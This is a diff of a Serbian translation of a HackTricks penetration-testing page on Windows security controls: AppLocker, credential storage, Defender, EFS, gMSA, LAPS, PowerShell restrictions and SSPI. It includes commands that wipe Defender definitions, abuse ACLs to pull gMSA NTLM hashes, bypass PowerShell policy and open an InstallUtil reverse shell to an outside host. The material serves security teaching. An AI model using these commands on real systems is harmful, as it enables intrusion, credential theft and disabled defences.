@@ -1,13 +1,13 @@
-# Windows bezbednosne kontrole
+# Kontrole bezbednosti Windowsa
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## AppLocker politika
 
-Lista dozvoljenih aplikacija je spisak odobrenih softverskih aplikacija ili izvršnih fajlova koji su dozvoljeni da budu prisutni i pokrenuti na sistemu. Cilj je zaštititi okruženje od štetnog malware-a i neodobrenog softvera koji nije u skladu sa specifičnim poslovnim potrebama organizacije.
+Lista dozvoljenih aplikacija (application whitelist) je spisak odobrenih softverskih aplikacija ili izvršnih fajlova koji su dozvoljeni da budu prisutni i pokreću se na sistemu. Cilj je zaštititi okruženje od štetnog malware-a i neodobrenog softvera koji nije u skladu sa specifičnim poslovnim potrebama organizacije.
 
-[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) je Microsoftovo rešenje za aplikacionu belu listu i daje sistemskim administratorima kontrolu nad **koje aplikacije i fajlove korisnici mogu pokretati**. Omogućava **preciznu kontrolu** nad izvršnim fajlovima, skriptama, Windows installer fajlovima, DLL-ovima, pakovanim aplikacijama i pakovanim installerima aplikacija.\
-Uobičajeno je da organizacije **blokiraju cmd.exe i PowerShell.exe** i pravo pisanja u određene direktorijume, **but this can all be bypassed**.
+[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) je Microsoftovo **rešenje za bele liste aplikacija** i daje administratorima sistema kontrolu nad **time koje aplikacije i fajlove korisnici mogu pokretati**. Pruža **detaljnu kontrolu** nad izvršnim fajlovima, skriptama, Windows installer fajlovima, DLL-ovima, paketiranim aplikacijama i instalaterima paketiranih aplikacija.\
+Uobičajeno je da organizacije **blokiraju cmd.exe i PowerShell.exe** i prava za upis u određene direktorijume, **ali sve to se može zaobići**.
 
 ### Provera
 
@@ -20,60 +20,60 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 $a = Get-ApplockerPolicy -effective
 $a.rulecollections
 ```
-Ova putanja u registru sadrži konfiguracije i politike koje primenjuje AppLocker, i omogućava pregled trenutnog skupa pravila koja se sprovode na sistemu:
+Ova putanja u registru sadrži konfiguracije i politike koje primenjuje AppLocker, omogućavajući pregled trenutnog skupa pravila koja se sprovode na sistemu:
 
 - `HKLM\Software\Policies\Microsoft\Windows\SrpV2`
 
-### Zaobilaženje
+### Bypass
 
-- Korisni direktorijumi u koje se može pisati za zaobilaženje AppLocker politike: Ako AppLocker dozvoljava izvršavanje bilo čega unutar `C:\Windows\System32` ili `C:\Windows`, postoje direktorijumi u koje se može pisati koje možete iskoristiti da ovo zaobiđete.
+- Korisne **Writable folders** za bypass AppLocker Policy: Ako AppLocker dozvoljava izvršavanje bilo čega unutar `C:\Windows\System32` ili `C:\Windows`, postoje **writable folders** koje možete koristiti da **bypass this**.
 ```
 C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 C:\Windows\System32\spool\drivers\color
 C:\Windows\Tasks
 C:\windows\tracing
 ```
-- Uobičajeno **pouzdani** [**"LOLBAS's"**](https://lolbas-project.github.io/) binarni fajlovi takođe mogu biti korisni za zaobilaženje AppLocker-a.
-- **Loše napisana pravila** takođe se mogu zaobići
-- Na primer, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, možete kreirati **folder nazvan `allowed`** bilo gde i biće dozvoljen.
-- Organizacije često fokusiraju blokiranje **`%System32%\WindowsPowerShell\v1.0\powershell.exe`** izvršnog fajla, ali zaborave na **druge** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) kao što su `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ili `PowerShell_ISE.exe`.
-- **DLL enforcement** retko je omogućena zbog dodatnog opterećenja koje može staviti na sistem i količine testiranja potrebnog da se osigura da ništa neće puknuti. Dakle, korišćenje **DLL-ova kao backdoora** pomaže u zaobilaženju AppLockera.
-- Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) da **izvršite PowerShell** kod u bilo kom procesu i zaobiđete AppLocker. Za više informacija pogledajte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).
+- Često **pouzdani** [**"LOLBAS's"**](https://lolbas-project.github.io/) binari mogu takođe biti korisni za zaobilaženje AppLocker-a.
+- **Loše napisana pravila se takođe mogu zaobići**
+- Na primer, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, možete kreirati **folder pod nazivom `allowed`** bilo gde i biće dozvoljen.
+- Organizacije često fokusiraju na **blokiranje `%System32%\WindowsPowerShell\v1.0\powershell.exe` izvršne datoteke**, ali zaborave na **druge** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) kao što su `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ili `PowerShell_ISE.exe`.
+- **DLL enforcement very rarely enabled** zbog dodatnog opterećenja koje može prouzrokovati sistemu, i količine testiranja potrebne da se osigura da ništa neće puknuti. Dakle, korišćenje **DLLs as backdoors will help bypassing AppLocker**.
+- Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) da **execute Powershell** kod u bilo kojem procesu i zaobiđete AppLocker. Za više informacija pogledajte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
-## Čuvanje kredencijala
+## Credentials Storage
 
-### Menadžer sigurnosnih naloga (SAM)
+### Security Accounts Manager (SAM)
 
-Lokalni kredencijali se nalaze u ovom fajlu, lozinke su heširane.
+Lokalni kredencijali nalaze se u ovoj datoteci; lozinke su heširane.
 
-### Lokalna sigurnosna vlast (LSA) - LSASS
+### Local Security Authority (LSA) - LSASS
 
-**Kredencijali** (heširani) su **sačuvani** u **memoriji** ovog subsistema iz razloga Single Sign-On.\  
-**LSA** administrira lokalnu **bezbednosnu politiku** (politika lozinki, dozvole korisnika...), **autentikaciju**, **access tokens**...\  
-LSA će biti taj koji će **proveravati** prosleđene kredencijale unutar **SAM** fajla (za lokalnu prijavu) i **komunicirati** sa **domain controller-om** da autentifikuje korisnika domena.
+The **credentials** (hashed) are **saved** in the **memory** of this subsystem for Single Sign-On reasons.\
+**LSA** administrates the local **security policy** (password policy, users permissions...), **authentication**, **access tokens**...\
+LSA will be the one that will **check** for provided credentials inside the **SAM** file (for a local login) and **talk** with the **domain controller** to authenticate a domain user.
 
-**Kredencijali** su **sačuvani** unutar **process-a LSASS**: Kerberos tiketi, NT i LM heševi, lako dešifrovane lozinke.
+The **credentials** are **saved** inside the **process LSASS**: Kerberos tickets, hashes NT and LM, easily decrypted passwords.
 
-### LSA tajne
+### LSA secrets
 
-LSA može sačuvati na disku neke kredencijale:
+LSA može sačuvati na disku određene kredencijale:
 
-- Lozinka computer naloga Active Directory-ja (ako domain controller nije dostupan).
+- Lozinka računarskog naloga Active Directory (ako je domain controller nedostupan).
 - Lozinke naloga Windows servisa
-- Lozinke za scheduled tasks
-- Još (lozinke IIS aplikacija...)
+- Lozinke za zakazane zadatke
+- Još (lozinka IIS aplikacija...)
 
 ### NTDS.dit
 
-To je baza podataka Active Directory-ja. Prisutna je samo na Domain Controller-ima.
+To je baza podataka Active Directory-ja. Prisutan je samo na Domain Controllers.
 
 ## Defender
 
-[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) je antivirus dostupan u Windows 10 i Windows 11, kao i u verzijama Windows Server-a. On **blokira** uobičajene pentesting alate kao što su **`WinPEAS`**. Međutim, postoje načini da se **zaobiđu ove zaštite**.
+[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) je Antivirus dostupan u Windows 10 i Windows 11, i u verzijama Windows Server. On **blokira** uobičajene pentesting alate kao što su **`WinPEAS`**. Međutim, postoje načini da se ove zaštite **zaobiđu**.
 
-### Provera
+### Check
 
-Da biste proverili **status** **Defender-a** možete pokrenuti PS cmdlet **`Get-MpComputerStatus`** (proverite vrednost **`RealTimeProtectionEnabled`** da znate da li je aktivan):
+Da biste proverili **status** Defender-a možete izvršiti PS cmdlet **`Get-MpComputerStatus`** (proverite vrednost **`RealTimeProtectionEnabled`** da znate da li je aktivan):
 
 <pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus
 
@@ -92,7 +92,7 @@ NISEngineVersion                : 0.0.0.0
 PSComputerName                  :
 </code></pre>
 
-Za enumeraciju ga takođe možete pokrenuti:
+Za enumeraciju možete takođe pokrenuti:
 ```bash
 WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
 wmic /namespace:\\root\securitycenter2 path antivirusproduct
@@ -101,36 +101,36 @@ sc query windefend
 #Delete all rules of Defender (useful for machines without internet access)
 "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 ```
-## Sistem za enkripciju fajlova (EFS)
+## Šifrovani fajl sistem (EFS)
 
-EFS štiti fajlove pomoću enkripcije, koristeći **simetrični ključ** poznat kao **File Encryption Key (FEK)**. Ovaj ključ se šifruje korisnikovim **javnim ključem** i čuva u $EFS **alternative data stream** šifrovanog fajla. Kada je potrebno dešifrovanje, odgovarajući **privatni ključ** korisničkog digitalnog sertifikata koristi se za dešifrovanje FEK-a iz $EFS stream-a. Više detalja možete pronaći [here](https://en.wikipedia.org/wiki/Encrypting_File_System).
+EFS štiti fajlove enkripcijom, koristeći **simetrični ključ** poznat kao **File Encryption Key (FEK)**. Ovaj ključ je šifrovan korisnikovim **javni ključ** i smešten u šifrovanom fajlu's $EFS **alternative data stream**. Kada je potrebna dešifrovanje, odgovarajući **privatni ključ** korisnikovog digitalnog sertifikata se koristi za dešifrovanje FEK-a iz $EFS strima. Više detalja možete naći [here](https://en.wikipedia.org/wiki/Encrypting_File_System).
 
-**Scenariji dešifrovanja bez inicijative korisnika** uključuju:
+**Slučajevi dešifrovanja bez inicijative korisnika** uključuju:
 
-- Kada se fajlovi ili folderi premeste na fajl sistem koji nije EFS, kao što je [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), oni se automatski dešifruju.
-- Šifrovani fajlovi poslati preko mreže koristeći SMB/CIFS protokol se dešifruju pre prenosa.
+- Kada se fajlovi ili fascikle prebace na fajl sistem koji nije EFS, kao što je [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), oni se automatski dešifruju.
+- Šifrovani fajlovi koji se šalju preko mreže putem SMB/CIFS protokola dešifruju se pre prenosa.
 
-Ova metoda enkripcije omogućava **transparentan pristup** šifrovanim fajlovima vlasniku. Međutim, samo menjanje vlasnikove lozinke i prijava neće obezbediti dešifrovanje.
+Ovaj metod enkripcije omogućava **transparentan pristup** šifrovanim fajlovima za vlasnika. Međutim, samo menjanje vlasnikove lozinke i prijava neće omogućiti dešifrovanje.
 
-Zaključci:
+**Ključne napomene**:
 
-- EFS koristi simetrični FEK, koji je šifrovan korisnikovim javnim ključem.
-- Dešifrovanje koristi korisnikov privatni ključ da pristupi FEK-u.
-- Automatsko dešifrovanje se dešava u specifičnim uslovima, kao što su kopiranje na FAT32 ili mrežni prenos.
-- Šifrovani fajlovi su vlasniku dostupni bez dodatnih koraka.
+- EFS koristi simetrični FEK, šifrovan korisnikovim javnim ključem.
+- Dešifrovanje koristi korisnikov privatni ključ za pristup FEK-u.
+- Automatsko dešifrovanje se događa u specifičnim uslovima, kao što su kopiranje na FAT32 ili mrežni prenos.
+- Šifrovani fajlovi su dostupni vlasniku bez dodatnih koraka.
 
-### Provera informacija o EFS
+### Provera EFS informacija
 
-Proverite da li je **korisnik** **koristio** ovu **uslugu** proverom da li postoji ovaj put:`C:\users\<username>\appdata\roaming\Microsoft\Protect`
+Proverite da li je **korisnik** koristio ovu **uslugu** proverom da li postoji putanja: `C:\users\<username>\appdata\roaming\Microsoft\Protect`
 
-Proverite **ko** ima **pristup** fajlu koristeći cipher /c \<file>\
-Takođe možete koristiti `cipher /e` i `cipher /d` unutar foldera da **enkriptujete** i **dešifrujete** sve fajlove
+Proverite **ko** ima **pristup** fajlu koristeći `cipher /c \<file\>`  
+Takođe možete koristiti `cipher /e` i `cipher /d` unutar foldera da **šifrujete** i **dešifrujete** sve fajlove
 
-### Dekripcija EFS fajlova
+### Dešifrovanje EFS fajlova
 
-#### Biti SYSTEM
+#### Kao SYSTEM nalog
 
-Ovaj način zahteva da žrtvin **korisnik** pokreće neki **proces** na hostu. Ako je to slučaj, koristeći `meterpreter` sesiju možete imitirati token procesa tog korisnika (`impersonate_token` iz `incognito`). Ili jednostavno možete `migrate` u proces tog korisnika.
+Ovaj način zahteva da **žrtvovani korisnik** pokreće **proces** na hostu. Ako je to slučaj, koristeći `meterpreter` sesiju možete impersonirati token procesa korisnika (`impersonate_token` iz `incognito`). Ili možete jednostavno `migrate` u proces korisnika.
 
 #### Poznavanje lozinke korisnika
 
@@ -139,17 +139,17 @@ Ovaj način zahteva da žrtvin **korisnik** pokreće neki **proces** na hostu. A
 https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
 {{#endref}}
 
-## Grupni upravljani servisni nalozi (gMSA)
+## Grupno upravljani servisni nalozi (gMSA)
 
-Microsoft je razvio **Group Managed Service Accounts (gMSA)** da pojednostavi upravljanje servisnim nalozima u IT infrastrukturi. Za razliku od tradicionalnih servisnih naloga koji često imaju uključenu opciju "**Password never expire**", gMSA pružaju sigurnije i jednostavnije rešenje:
+Microsoft je razvio **Group Managed Service Accounts (gMSA)** da pojednostavi upravljanje servisnim nalozima u IT infrastrukturi. Za razliku od tradicionalnih servisnih naloga koji često imaju omogućeno podešavanje "**Password never expire**", gMSA nude sigurnije i lakše za upravljanje rešenje:
 
-- **Automatsko upravljanje lozinkom**: gMSA koriste kompleksnu, 240-karakternu lozinku koja se automatski menja u skladu sa politikom domena ili računara. Ovaj proces obavlja Microsoft-ov Key Distribution Service (KDC), eliminišući potrebu za ručnim ažuriranjem lozinki.
-- **Povećana bezbednost**: ovi nalozi su imuni na zaključavanja i ne mogu se koristiti za interaktivne prijave, što poboljšava bezbednost.
-- **Podrška za više hostova**: gMSA se mogu deliti na više hostova, što ih čini idealnim za servise koji rade na više servera.
-- **Mogućnost zakazanih zadataka**: za razliku od managed service accounts, gMSA podržavaju pokretanje zakazanih zadataka.
-- **Pojednostavljeno upravljanje SPN-om**: sistem automatski ažurira Service Principal Name (SPN) kada dođe do promena u sAMaccount detaljima računara ili DNS imenu, što pojednostavljuje upravljanje SPN-om.
+- **Automatic Password Management**: gMSA koriste kompleksnu lozinku od 240 karaktera koja se automatski menja u skladu sa politikom domena ili računara. Ovaj proces je u nadležnosti Microsoft's Key Distribution Service (KDC), eliminišući potrebu za ručnim ažuriranjem lozinki.
+- **Enhanced Security**: Ovi nalozi su imuni na zaključavanja i ne mogu se koristiti za interaktivne prijave, čime se povećava njihova sigurnost.
+- **Multiple Host Support**: gMSA se mogu deliti između više hostova, što ih čini pogodnim za servise koji rade na više servera.
+- **Scheduled Task Capability**: Za razliku od managed service accounts, gMSA podržavaju izvršavanje zakazanih zadataka.
+- **Simplified SPN Management**: Sistem automatski ažurira Service Principal Name (SPN) kada dođe do promena u sAMAccount imenima računara ili DNS imenu, čime se pojednostavljuje upravljanje SPN-ovima.
 
-Lozinke za gMSA se čuvaju u LDAP atributu _**msDS-ManagedPassword**_ i automatski se resetuju svakih 30 dana od strane Domain Controller-a (DC). Ova lozinka, enkriptovani data blob poznat kao [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), može biti dohvaćena samo od strane autorizovanih administratora i servera na kojima su gMSA instalirani, što obezbeđuje sigurno okruženje. Za pristup ovim informacijama potreban je zaštićen konekcija kao što je LDAPS, ili konekcija mora biti autentifikovana sa 'Sealing & Secure'.
+Lozinke za gMSA se čuvaju u LDAP svojstvu _**msDS-ManagedPassword**_ i automatski se resetuju na svakih 30 dana od strane Domain Controller-a (DC). Ova lozinka, enkriptovani data blob poznat kao [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), može da bude preuzeta samo od strane ovlašćenih administratora i servera na kojima su gMSA instalirani, čime se obezbeđuje bezbedno okruženje. Za pristup ovim informacijama potreban je zaštićeni konekcija kao što je LDAPS, ili konekcija mora biti autentifikovana sa 'Sealing & Secure'.
 
 ![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)
 
@@ -159,46 +159,46 @@ Ovu lozinku možete pročitati pomoću [**GMSAPasswordReader**](https://github.c
 ```
 [**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)
 
-Takođe, pogledajte ovu [web page](https://cube0x0.github.io/Relaying-for-gMSA/) o tome kako izvesti **NTLM relay attack** da biste pročitali **lozinku** **gMSA**.
+Takođe, pogledajte ovu [web page](https://cube0x0.github.io/Relaying-for-gMSA/) o tome kako izvesti **NTLM relay attack** da biste pročitali **password** od **gMSA**.
 
-### Zloupotreba povezivanja ACL-ova za čitanje upravljane lozinke gMSA (GenericAll -> ReadGMSAPassword)
+### Zloupotreba ACL chaining-a za čitanje gMSA managed password (GenericAll -> ReadGMSAPassword)
 
-U mnogim okruženjima, korisnici sa niskim privilegijama mogu doći do tajni gMSA bez kompromitovanja DC-a zloupotrebom pogrešno konfigurisanim ACL-ovima objekata:
+U mnogim okruženjima, korisnici sa niskim privilegijama mogu da dođu do gMSA tajni bez kompromitovanja DC-a zloupotrebom pogrešno konfigurisanih object ACL-ova:
 
-- Grupi kojom možete upravljati (npr. preko GenericAll/GenericWrite) dodeljeno je `ReadGMSAPassword` nad gMSA.
-- Dodavanjem sebe u tu grupu nasleđujete pravo da pročitate `msDS-ManagedPassword` blob gMSA preko LDAP-a i dođete do upotrebljivih NTLM kredencijala.
+- Grupi kojom možete da upravljate (npr. preko GenericAll/GenericWrite) je dodeljeno `ReadGMSAPassword` nad gMSA.
+- Dodavanjem sebe u tu grupu nasledite pravo da pročitate gMSA-ov `msDS-ManagedPassword` blob preko LDAP-a i izvedete upotrebljive NTLM credentials.
 
 Tipičan tok rada:
 
-1) Pronađite put pomoću BloodHound i označite svoje foothold principals kao Owned. Potražite ivice kao:
+1) Otkrijte put koristeći BloodHound i označite vaše foothold principals kao Owned. Potražite veze poput:
 - GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA
 
-2) Dodajte sebe u posrednu grupu kojom upravljate (primer sa bloodyAD):
+2) Dodajte sebe u međugrupu kojom upravljate (primer sa bloodyAD):
 ```bash
 bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
 ```
-3) Pročitajte upravljanu lozinku gMSA preko LDAP-a i izvedite NTLM hash. NetExec automatizuje ekstrakciju `msDS-ManagedPassword` i konverziju u NTLM:
+3) Pročitajte gMSA upravljanu lozinku preko LDAP-a i izvedite NTLM hash. NetExec automatizuje ekstrakciju `msDS-ManagedPassword` i konverziju u NTLM:
 ```bash
 # Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
 netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
 # Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
 ```
-4) Autentifikujte se kao gMSA koristeći NTLM hash (nije potreban plaintext). Ako je nalog u Remote Management Users, WinRM će raditi direktno:
+Autentifikujte se kao gMSA koristeći NTLM hash (nije potreban plaintext). Ako je nalog u Remote Management Users, WinRM će raditi direktno:
 ```bash
 # SMB / WinRM as the gMSA using the NT hash
 netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
 netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
 ```
 Napomene:
-- LDAP čitanja atributa `msDS-ManagedPassword` zahtevaju sealing (npr. LDAPS/sign+seal). Alati ovo automatski obrađuju.
-- gMSA-ima se često dodeljuju lokalna prava kao što je WinRM; proverite članstvo u grupama (npr. Remote Management Users) da biste planirali lateral movement.
-- Ako vam je potreban samo blob da sami izračunate NTLM, pogledajte strukturu MSDS-MANAGEDPASSWORD_BLOB.
+- LDAP čitanja atributa `msDS-ManagedPassword` zahtevaju sealing (npr. LDAPS/sign+seal). Alati to obično odrade automatski.
+- gMSAs često dobijaju lokalna prava kao što su WinRM; proverite članstvo u grupama (npr. Remote Management Users) da biste planirali lateral movement.
+- Ako vam treba samo blob da biste sami izračunali NTLM, pogledajte strukturu MSDS-MANAGEDPASSWORD_BLOB.
 
 
 
 ## LAPS
 
-The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), omogućava upravljanje lokalnim Administrator lozinkama. Ove lozinke, koje su **nasumično generisane**, jedinstvene i **redovno menjane**, čuvaju se centralno u Active Directory. Pristup ovim lozinkama je ograničen ACL-ima samo za ovlašćene korisnike. Ako su dodeljena odgovarajuća prava, omogućeno je čitanje lokalnih admin lozinki.
+The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), omogućava upravljanje lokalnim lozinkama Administratora. Ove lozinke, koje su **nasumično generisane**, jedinstvene i **redovno menjane**, čuvaju se centralno u Active Directory. Pristup ovim lozinkama je ograničen putem ACLs samo ovlašćenim korisnicima. Ako su dodeljene dovoljne dozvole, omogućeno je čitanje lokalnih admin lozinki.
 
 
 {{#ref}}
@@ -207,9 +207,9 @@ The **Local Administrator Password Solution (LAPS)**, available for download fro
 
 ## PS Constrained Language Mode
 
-PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **ograničava mnoge funkcionalnosti** potrebne za efikasno korišćenje PowerShell-a, kao što su blokiranje COM objekata, dozvoljavanje samo odobrenih .NET tipova, XAML-based workflows, PowerShell classes, i slično.
+PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **ograničava mnoge funkcije** potrebne za efikasno korišćenje PowerShell-a, kao što su blokiranje COM objekata, dopuštanje samo odobrenih .NET tipova, XAML-based workflows, PowerShell classes i drugo.
 
-### **Proverite**
+### **Proveri**
 ```bash
 $ExecutionContext.SessionState.LanguageMode
 #Values could be: FullLanguage or ConstrainedLanguage
@@ -219,8 +219,8 @@ $ExecutionContext.SessionState.LanguageMode
 #Easy bypass
 Powershell -version 2
 ```
-Na aktuelnim verzijama Windows-a taj Bypass neće raditi, ali možete koristiti[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
-**Za kompajliranje možda ćete morati** **da** _**Dodate referencu**_ -> _Browse_ ->_Browse_ -> dodajte `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` i **promenite projekat na .Net4.5**.
+U trenutnim verzijama Windows-a taj Bypass neće raditi, ali možete koristiti[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
+**Za kompajliranje možda ćete morati** **da** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> dodajte `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` i **promenite projekat na .Net4.5**.
 
 #### Direktan bypass:
 ```bash
@@ -230,11 +230,11 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
-Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) da izvršite Powershell kod u bilo kojem procesu i zaobiđete ograničeni režim. Za više informacija pogledajte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).
+Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) da **execute Powershell** code u bilo kojem procesu i zaobiđete constrained mode. Za više informacija pogledajte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).
 
-## PS politika izvršavanja
+## PS Execution Policy
 
-Podrazumevano je podešeno na **restricted.** Glavni načini za zaobilaženje ove politike:
+Podrazumevano je postavljeno na **restricted.** Glavni načini za zaobilaženje ove politike:
 ```bash
 1º Just copy and paste inside the interactive PS console
 2º Read en Exec
@@ -254,32 +254,32 @@ Powershell -command "Write-Host 'My voice is my passport, verify me.'"
 9º Use EncodeCommand
 $command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
 ```
-Više informacija se može naći [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
+Više informacija možete pronaći [ovde](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
 
-## Security Support Provider Interface (SSPI)
+## Interfejs Security Support Provider (SSPI)
 
-To je API koji se može koristiti za autentifikaciju korisnika.
+Je API koji se može koristiti za autentifikaciju korisnika.
 
-SSPI će biti zadužen za pronalaženje odgovarajućeg protokola za dve mašine koje žele da komuniciraju. Preferirani metod za to je Kerberos. Zatim će SSPI pregovarati koji autentifikacioni protokol će biti korišćen; ti autentifikacioni protokoli se zovu Security Support Provider (SSP), nalaze se na svakoj Windows mašini u obliku DLL-a i obe mašine moraju podržavati isti da bi mogle da komuniciraju.
+SSPI će biti zadužen za pronalaženje odgovarajućeg protokola za dve mašine koje žele da komuniciraju. Preferirani metod za ovo je Kerberos. Zatim će SSPI pregovarati koji će se authentication protocol koristiti — ti authentication protocolli se zovu Security Support Provider (SSP), nalaze se na svakoj Windows mašini u obliku DLL-a i obe mašine moraju podržavati isti da bi mogle da komuniciraju.
 
 ### Glavni SSP-ovi
 
 - **Kerberos**: Preferirani
 - %windir%\Windows\System32\kerberos.dll
-- **NTLMv1** and **NTLMv2**: Razlozi kompatibilnosti
+- **NTLMv1** and **NTLMv2**: Iz razloga kompatibilnosti
 - %windir%\Windows\System32\msv1_0.dll
-- **Digest**: web serveri i LDAP, lozinka u obliku MD5 heša
+- **Digest**: Web servers and LDAP, lozinka u obliku MD5 heša
 - %windir%\Windows\System32\Wdigest.dll
 - **Schannel**: SSL i TLS
 - %windir%\Windows\System32\Schannel.dll
-- **Negotiate**: Koristi se za pregovaranje o protokolu koji će se koristiti (Kerberos ili NTLM, pri čemu je Kerberos podrazumevani)
+- **Negotiate**: Koristi se za pregovaranje koji protokol će se koristiti (Kerberos ili NTLM, pri čemu je Kerberos podrazumevani)
 - %windir%\Windows\System32\lsasrv.dll
 
-#### Pregovori mogu ponuditi više metoda ili samo jednu.
+#### Pregovaranje može ponuditi više metoda ili samo jednu.
 
 ## UAC - User Account Control
 
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **upit za saglasnost pri aktivnostima sa povišenim privilegijama**.
+[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **upit za saglasnost za aktivnosti sa povišenim privilegijama**.
 
 
 {{#ref}}
